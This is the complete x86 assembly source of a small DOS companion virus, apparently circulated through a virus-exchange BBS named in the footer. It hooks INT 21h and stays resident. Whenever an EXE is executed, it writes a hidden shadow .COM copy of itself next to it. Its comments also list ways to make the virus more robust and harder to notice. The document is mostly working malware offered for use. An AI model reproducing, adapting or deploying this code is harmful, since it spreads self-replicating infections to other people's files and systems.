tic             segment
                org     100h
                assume  cs:tic, ds:tic, es:tic
;
len     equ     offset int21-100h       ;LENGTH OF VIRUS CODE
;
;THE FOLLOWING CODE MAKES THE VIRUS GO RESIDENT. TO KEEP THE INFECTION
;CODE AS SHORT AS POSSIBLE, THE INT 21 VECTOR (4 BYTES) IS SAVED OUTSIDE
;THE VIRUS BODY. THIS MAY OCCASIONALLY CAUSE THE VECTOR TO BE OVERWRITTEN
;BY THE ENVIRONMENT, WHICH WILL CRASH THE SYSTEM. TO PREVENT THIS, DEFINE
;TWO WORDS FOR THE LABEL INT21 AND ADD FOUR BYTES TO THE RESIDENT CODE.
;THE FIRST TIME THAT AN "INFECTED" FILE IS RUN, IT WILL SIMPLY RETURN TO
;DOS. THIS IS BECAUSE THE RESIDENT CODE MUST FIRST BE LOADED. AFTER THAT
;EVERYTHING WILL APPEAR TO WORK NORMALLY. TO REMEDY THIS PROBLEM, ALTER
;THE MEMORY CONTROL BLOCK TO TRAP THE RESIDENT CODE, THEN JUMP TO IT. A
;STILL BETTER SOLUTION IS TO COPY THE VIRUS TO THE TOP OF MEMORY AND
;TRAP IT THERE. ALSO, DO NOT REVECTOR INTERRUPT BUT OVERWRITE THE
;ENTRY POINT WITH A FAR JUMP TO THE VIRUS AND THEN RESTORE IT. THESE
;TECHNIQUES WILL MAKE A BETTER, THOUGH LONGER VIRUS.
;
start:          mov     ax,3521h                ;GET INT 21 VECTOR
                int     21h
                mov     di,offset int21
                mov     [di],bx                 ;SAVE IT
                mov     [di+2],es
                mov     dx,offset infect
                mov     ah,25h
                int     21h                     ;REVECTOR TO VIRUS
                mov     dx,di
                int     27h                     ;GO RESIDENT
;
;THIS IS THE ACTUAL INFECTION CODE. IT CHECKS FOR THE EXEC FUNCTION THEN
;TRIES TO RUN THE PROCESS AS AN EXE. IF THIS FAILS, THE VIRUS KNOWS THAT
;IT REALLY WAS A COM PROGRAM, IN WHICH CASE IT SIMPLY LETS THE CALL GO
;THROUGH. OTHERWISE A SHADOW COM FILE IS (RE)CREATED, "INFECTING" THE
;EXE. THE HIDDEN ATTRIBUTE IS SET ON THE SHADOW FILE. TO KEEP THESE FILES
;VISIBLE, SET CX TO 0 INSTEAD OF 2.
;NOTE: UNDER DOS 5.0, REGISTERS ES AND DS ARE SAME WHEN THE EXEC CALL
;IS ISSUED. SETTING ES TO DS IS ONLY NECESSARY TO MAKE THE VIRUS RUN UNDER
;DOS 3.X. OTHERWISE YOU CAN ELIMINATE THESE INSTRUCTIOS, BRINGING THE VIRUS
;BACK TO JUST 79 BYTES.
;
infect:         cmp     ax,4b00h                ;EXEC?
                jne     interrupt               ;IF NOT, CONTINUE INTERRUPT
                push    ax                      ;KEEP FUNCTION CALL
                push    es                      ;KEEP ES
                push    ds                      ;SET ES TO DS
                pop     es
                mov     di,dx                   ;SCAN TO EXT
                mov     al,'.'
                repne   scasb
                push    di                      ;POINTER TO EXT
                mov     ax,'XE'                 ;TRY TO RUN AS .EXE
                stosw
                stosb
                pop     di                      ;RETREIVE POINTER TO EXT
                pop     es                      ;RESTORE ES FOR EXEC
                pop     ax                      ;GET FUNCTION
                push    ax                      ;KEEP IT
                push    dx                      ;KEEP POINTER TO PROCESS NAME
                pushf                           ;DO INTERRUPT
                push    cs
                call    interrupt
                mov     ax,'OC'                 ;CHANGE EXT TO COM
                stosw
                mov     al,'M'
                stosb
                pop     dx                      ;CLEAR STACK
                pop     ax
                jc      interrupt               ;WASN'T .EXE SO JUST CONTINUE
                mov     cx,2
                mov     ah,3ch                  ;CREATE SHADOW .COM FILE
                int     21h
                xchg    bx,ax                   ;GET HANDLE
                push    cs                      ;WRITE VIRUS TO .COM FILE
                pop     ds                      ;SEGMENT OF VIRUS CODE
                mov     cl,len
                mov     dx,si                   ;=0100 HEX
                mov     ah,40h                  ;WRITE VIRUS AND EXIT
;
interrupt:
        db      0eah                            ;FAR JUMP
int21:                                          ;VECTOR GOES HERE
;
tic             ends
                end     start

; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
; 컴컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴
; 컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴
; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

